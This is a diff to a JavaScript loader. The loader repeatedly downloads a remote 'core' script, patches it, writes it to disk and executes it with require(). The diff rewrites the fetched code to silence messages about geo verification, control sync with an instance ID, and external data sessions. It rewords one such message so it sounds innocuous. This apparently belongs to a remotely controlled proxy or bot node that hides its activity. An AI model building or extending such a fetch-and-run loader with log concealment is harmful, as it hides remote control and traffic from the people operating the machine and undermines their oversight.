@@ -60,87 +60,15 @@ function prepareCore(src) {
     .replace(
       "console.log('[check] first external data session established');",
       "console.log('[check] data path validated');"
+    )
+    .replace(
+      "      console.log(`[geo] verified country=${country.code}`);",
+      "      /* routine geo success intentionally quiet */"
+    )
+    .replace(
+      "    console.log(`[control] sync ok instance=${ID.instanceId} name=${displayName()} mode=${controlMode()}`);",
+      "    /* routine control success intentionally quiet */"
     );
-}
-
-/*
- * Console policy only. This deliberately does not alter registration, geo,
- * heartbeat, traffic, endpoint learning, timers, or retry behavior.
- * Repeated routine state messages are suppressed; state changes and errors
- * remain visible.
- */
-function installQuietConsole() {
-  const raw = {
-    log: console.log.bind(console),
-    warn: console.warn.bind(console),
-    error: console.error.bind(console)
-  };
-
-  let geoState = null;
-  let controlState = null;
-  let routeState = null;
-
-  function text(args) {
-    return args.map(v => typeof v === 'string' ? v : String(v)).join(' ');
-  }
-
-  function emit(method, args) {
-    const line = text(args);
-
-    if (line.startsWith('[geo] verified country=')) {
-      const next = `verified:${line.slice('[geo] verified country='.length)}`;
-      if (geoState === next) return;
-      geoState = next;
-      raw[method](...args);
-      return;
-    }
-
-    if (line.startsWith('[geo] verification incomplete; country=')) {
-      const next = `incomplete:${line.slice('[geo] verification incomplete; country='.length)}`;
-      if (geoState === next) return;
-      geoState = next;
-      raw[method](...args);
-      return;
-    }
-
-    if (line === '[geo] sources disagree; country left unknown') {
-      const next = 'mismatch';
-      if (geoState === next) return;
-      geoState = next;
-      raw[method](...args);
-      return;
-    }
-
-    if (line.startsWith('[control] sync ok ')) {
-      const next = 'ok';
-      if (controlState === next) return;
-      controlState = next;
-      raw[method](...args);
-      return;
-    }
-
-    if (line.startsWith('[control] sync pending: ')) {
-      const next = `error:${line.slice('[control] sync pending: '.length)}`;
-      if (controlState === next) return;
-      controlState = next;
-      raw[method](...args);
-      return;
-    }
-
-    if (line.startsWith('[route] public address learned ')) {
-      const next = line.slice('[route] public address learned '.length);
-      if (routeState === next) return;
-      routeState = next;
-      raw[method](...args);
-      return;
-    }
-
-    raw[method](...args);
-  }
-
-  console.log = (...args) => emit('log', args);
-  console.warn = (...args) => emit('warn', args);
-  console.error = (...args) => emit('error', args);
 }
 
 function identity() {
@@ -289,7 +217,6 @@ async function checkLoop() {
   try {
     const src = prepareCore(await obtainCore());
     fs.writeFileSync(CORE_FILE, src, { mode: 0o600 });
-    installQuietConsole();
     require(CORE_FILE);
     setTimeout(() => checkLoop().catch(() => {}), 2500).unref();
   } catch (e) {
